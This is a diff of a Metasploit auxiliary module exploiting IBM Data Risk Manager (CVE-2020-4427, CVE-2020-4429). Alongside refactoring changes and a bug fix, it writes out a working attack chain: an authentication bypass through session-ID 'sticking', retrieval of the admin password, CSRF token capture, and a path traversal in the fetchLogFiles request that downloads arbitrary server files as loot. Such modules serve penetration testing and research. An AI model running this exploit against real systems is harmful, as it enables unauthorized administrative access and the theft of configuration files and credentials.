@@ -3,12 +3,10 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'zip'
-
 class MetasploitModule < Msf::Auxiliary
 
-  include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
+  include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(
@@ -31,26 +29,29 @@ class MetasploitModule < Msf::Auxiliary
             'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module
           ],
         'License' => MSF_LICENSE,
+        'DefaultOptions' =>
+          {
+            'SSL' => true
+          },
         'References' =>
           [
-            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
-            [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ],
             [ 'CVE', '2020-4427' ], # auth bypass
             [ 'CVE', '2020-4429' ], # insecure default password
+            [ 'URL', 'https://github.com/pedrib/PoC/blob/master/advisories/IBM/ibm_drm/ibm_drm_rce.md' ],
+            [ 'URL', 'https://seclists.org/fulldisclosure/2020/Apr/33' ]
           ],
-        'DisclosureDate' => 'Apr 21 2020'
+        'DisclosureDate' => '2020-04-21'
       )
     )
 
     register_options(
       [
-        OptPort.new('RPORT', [true, 'The target port', 8443]),
-        OptBool.new('SSL', [true, 'Connect with TLS', true]),
+        Opt::RPORT(8443),
         OptString.new('TARGETURI', [ true, 'Default server path', '/']),
         OptString.new('FILEPATH', [
           false, 'Path of the file to download',
           '/home/a3user/Tomcat/webapps/albatross/WEB-INF/classes/application.properties'
-        ]),
+        ])
       ]
     )
   end
@@ -59,7 +60,7 @@ class MetasploitModule < Msf::Auxiliary
     # at the moment there is no better way to detect AND be stealthy about it
     session_id = Rex::Text.rand_text_alpha(5..12)
     res = send_request_cgi({
-      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
+      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),
       'method' => 'GET',
       'vars_get' => {
         'id' => session_id,
@@ -70,25 +71,25 @@ class MetasploitModule < Msf::Auxiliary
       return Exploit::CheckCode::Detected
     end
 
-    return Exploit::CheckCode::Unknown
+    Exploit::CheckCode::Unknown
   end
 
   def create_session_id
     # step 1: create a session ID and try to make it stick
     session_id = Rex::Text.rand_text_alpha(5..12)
     res = send_request_cgi({
-      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'saml', 'idpSelection'),
+      'uri' => normalize_uri(target_uri.path, 'albatross', 'saml', 'idpSelection'),
       'method' => 'GET',
       'vars_get' => {
         'id' => session_id,
         'userName' => 'admin'
       }
     })
-    if res && (res.code = !302)
+    if res && (res.code != 302)
       fail_with(Failure::Unknown, "#{peer} - Failed to \"stick\" session ID")
-    else
-      print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")
     end
+
+    print_good("#{peer} - Successfully \"stickied\" our session ID #{session_id}")
 
     session_id
   end
@@ -103,14 +104,14 @@ class MetasploitModule < Msf::Auxiliary
     post_data.add_part(session_id, nil, nil, content_disposition = 'form-data; name="sessionId"')
 
     res = send_request_cgi({
-      'uri' => normalize_uri(datastore['TARGETURI'], 'albatross', 'user', 'login'),
+      'uri' => normalize_uri(target_uri.path, 'albatross', 'user', 'login'),
       'method' => 'POST',
       'data' => post_data.to_s,
       'ctype' => "multipart/form-data; boundary=#{post_data.bound}"
     })
 
-    unless res && (res.code == 200) && res.body[/\"data\":\"([0-9a-f\-]{36})/]
-      fail_with(Failure::Unknown, "#{peer} - Failed to obtain the admin password.")
+    unless res && (res.code == 200) && res.body[/"data":"([0-9a-f\-]{36})/]
+      fail_with(Failure::NoAccess, "#{peer} - Failed to obtain the admin password.")
     end
 
     password = Regexp.last_match(1)
@@ -130,7 +131,7 @@ class MetasploitModule < Msf::Auxiliary
       }
     })
     unless res && (res.code == 302) && res.get_cookies
-      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate as an admin.")
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate as an admin.")
     end
 
     print_good("#{peer} - ... and are authenticated as an admin!")
@@ -144,8 +145,8 @@ class MetasploitModule < Msf::Auxiliary
       'cookie' => cookie
     })
 
-    unless res && (res.code == 200) && res.body =~ /var csrfToken \= \"([0-9a-f\-]{36})\";/
-      fail_with(Failure::Unknown, "#{peer} - Failed to authenticate obtain CSRF cookie.")
+    unless res && (res.code == 200) && res.body =~ /var csrfToken = "([0-9a-f\-]{36})";/
+      fail_with(Failure::NoAccess, "#{peer} - Failed to authenticate obtain CSRF cookie.")
     end
     csrf = Regexp.last_match(1)
 
@@ -164,10 +165,14 @@ class MetasploitModule < Msf::Auxiliary
     cookie, csrf = login_and_csrf(password)
 
     # step 5: download the file!
-    post_data = %({"instanceId":"local_host","logLevel":"DEBUG","logFileNameList":"../../../../..#{datastore['FILEPATH']}"})
+    post_data = {
+      'instanceId' => 'local_host',
+      'logLevel' => 'DEBUG',
+      'logFileNameList' => "../../../../..#{datastore['FILEPATH']}"
+    }.to_json
 
     res = send_request_cgi({
-      'uri' => normalize_uri(datastore['targeturi'], 'albatross', 'eurekaservice', 'fetchLogFiles'),
+      'uri' => normalize_uri(target_uri.path, 'albatross', 'eurekaservice', 'fetchLogFiles'),
       'method' => 'POST',
       'cookie' => cookie,
       'headers' => { 'CSRF-TOKEN' => csrf },
@@ -194,7 +199,7 @@ class MetasploitModule < Msf::Auxiliary
       path = store_loot(
         'IBM_DRM.http',
         'application/octet-stream',
-        datastore['RHOST'],
+        rhost,
         filedata,
         fname
       )
